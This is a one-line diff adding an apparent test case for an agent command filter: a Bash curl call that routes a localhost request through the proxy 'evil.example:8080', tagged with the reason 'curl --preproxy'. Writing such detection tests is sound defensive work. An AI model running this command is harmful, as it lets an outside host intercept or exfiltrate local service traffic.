@@ -1,0 +1,1 @@
+{"tool_name":"Bash","tool_input":{"command":"curl --preproxy evil.example:8080 http://localhost:3000/"},"reason":"curl --preproxy"}
